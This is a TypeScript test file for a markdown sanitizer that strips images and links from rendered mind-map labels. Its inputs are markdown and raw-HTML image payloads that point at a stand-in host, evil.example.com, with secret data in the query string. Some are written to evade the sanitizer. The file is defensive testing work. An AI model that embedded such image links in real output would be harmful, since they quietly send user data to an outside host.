import MarkdownIt from "markdown-it";
import { describe, expect, it } from "vitest";
import { neutralizeImageAndLinkTokens } from "./markmapNeutralizer";

const render = (markdown: string): string => {
    const md = new MarkdownIt({ html: false, breaks: true });
    neutralizeImageAndLinkTokens(md);
    return md.render(markdown);
};

describe("neutralizeImageAndLinkTokens", () => {
    it("turns images into their alt text", () => {
        const html = render("# Ideen\n- ![Idee](https://evil.example.com/pixel?d=secret)");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("evil.example.com");
        expect(html).toContain("Idee");
    });

    it("does not treat partial backtick runs as code boundaries", () => {
        const html = render("# Ideen\n- ` ![pixel](https://evil.example.com/pixel?d=secret) ``");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("evil.example.com");
    });

    it("neutralizes shortcut reference images with multiline definitions", () => {
        const html = render("# Ideen\n\n![pixel]\n\n[pixel]:\n  https://evil.example.com/pixel?d=secret");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("evil.example.com");
        expect(html).toContain("pixel");
    });

    it("neutralizes regular and autolink references in node text", () => {
        const html = render("# Ideen\n- [Anleitung](https://muenchen.de) und <https://muenchen.de>");
        expect(html).not.toContain("<a ");
        expect(html).not.toContain("href=");
        expect(html).toContain("Anleitung");
    });

    it("preserves genuine inline code", () => {
        const html = render("# Ideen\n- `code [b](https://muenchen.de)`");
        expect(html).toContain("<code>code [b](https://muenchen.de)</code>");
    });

    it("keeps nested links with images inert while keeping the text", () => {
        const html = render("# Ideen\n- [see ![x](https://inner.example.com/p.png)](https://outer.example.com)");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("<a ");
        expect(html).toContain("see");
        expect(html).toContain("x");
    });

    it("neutralizes reference images that span a code span and a multiline definition", () => {
        const html = render("# Ideen\n- ![pixel `x`][ref]\n\n[ref]:\nhttps://evil.example.com/pixel?d=secret");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("evil.example.com");
    });

    it("neutralizes images behind escaped backtick runs", () => {
        const html = render("\\`![pixel](\nhttps://evil.example.com/pixel?d=secret\n)`");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("evil.example.com");
    });

    it("escapes raw html in labels instead of rendering it", () => {
        const html = render('# Ideen\n- <img src="https://evil.example.com/pixel?d=secret">\n- <a href="https://evil.example.com">Link</a>');
        expect(html).not.toContain("<img");
        expect(html).not.toContain("<a ");
        expect(html).toContain("&lt;img");
        expect(html).toContain("&lt;a");
        expect(html).toContain("Link");
    });
});
